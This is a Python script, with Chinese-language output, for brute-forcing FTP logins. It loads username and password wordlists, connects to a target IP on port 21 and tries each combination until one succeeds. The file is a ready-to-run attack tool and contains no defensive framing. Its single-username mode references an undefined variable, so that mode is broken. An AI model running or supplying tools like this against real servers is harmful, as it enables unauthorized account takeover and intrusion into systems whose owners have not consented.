# encoding: utf-8
from ftplib import FTP
import argparse
def UserDictionary():
    print("搜索用户字典...")
    try:
        user=open('user.txt','r')
        print("打开用户字典成功")
        return user
    except Exception:
        print('''未找到用户字典''')
        exit()
        
def PasswordDictionary():
    print("搜索密码字典...")
    try:
        password=open('password.txt','r')
        print("打开密码字典成功")
        return password
    except Exception:
        print('''未找到密码字典''')
        exit()
def GetPass(ftp,user,password):
    try:
        ftp.login(user,password)
        print("用户名：%s"%user)
        print("密码：%s"%password)
        return True
    except Exception:
        return False
print("FTP暴力破解")
# print('''1.用户名+密码字典
# 2.用户名字典+密码字典''')
# Patterns=int(input("请选择模式："))
 
# if Patterns==1:
#     #user=input("用户名：")
#     passwords=PasswordDictionary().readlines()
# elif Patterns==2:
#     users=UserDictionary().readlines()
#     passwords=PasswordDictionary().readlines()
# else:
#     print("输入错误！")
#     exit()

def ftpboom(IP,Patterns):
    if Patterns==1:
        #user=input("用户名：")
        passwords=PasswordDictionary().readlines()
    elif Patterns==2:
        users=UserDictionary().readlines()
        passwords=PasswordDictionary().readlines()
    else:
        print("输入错误！")
        exit()
    ftp=FTP()
    Port=21
    #IP=input("ip:")        
    print("连接%s中..."%IP)
    try :
        ftp.connect(IP,Port)
        print("连接成功")
    except Exception:
        print("连接失败")
        exit()
    if Patterns==1:
        for password in passwords:
            password=password.strip()
            print("test password:%s"%password)
            if(GetPass(ftp,user, password)):
                exit()
    elif Patterns==2:
        for user in users:
            for password in passwords:
                user=user.strip()
                password=password.strip()
                print("test user and password{user:%s|password;%s}"%(user,password))
                if(GetPass(ftp,user, password)):
                    exit()
    print("用户名或密码不在字典中")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-I', '--IP', type=str)
    parser.add_argument('-P', '--Patterns', type=int)
    # parser.add_argument('-u', '--yhzd', type=str)
    # parser.add_argument('-p', '--mmzd', type=str)
    args = parser.parse_args()
    print(ftpboom(args.IP,args.Patterns))